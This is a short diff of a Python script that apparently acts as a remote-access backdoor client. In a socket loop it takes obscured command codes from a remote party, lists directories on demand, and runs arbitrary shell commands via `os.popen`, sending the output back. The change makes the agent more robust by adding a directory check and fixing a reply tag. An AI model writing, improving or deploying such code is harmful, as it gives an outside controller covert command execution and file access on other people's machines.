@@ -27,11 +27,12 @@ while True:
         incoming_message = ast.literal_eval(incoming_message)
 
         if(incoming_message[0] == "vfisd"):
-            myDir = os.listdir(incoming_message[1])
-            
-            end = str(['vfisd', myDir])
+            if(os.path.exists(incoming_message[1])):
+                myDir = os.listdir(incoming_message[1])
+                end = str(['vfisd', myDir])
+            else:
+                end = str(['vfisd', "Invalid directory provided."])
             end = end.encode()
-
             s.send(end)
 
         if(incoming_message[0] == "smbwm"):
@@ -50,7 +51,7 @@ while True:
         if(incoming_message[0] == "ewc"):
             result = os.popen(incoming_message[1]).read()
 
-            end = str(['ewd', result])
+            end = str(['ewc', result])
             end = end.encode()
 
             s.send(end)
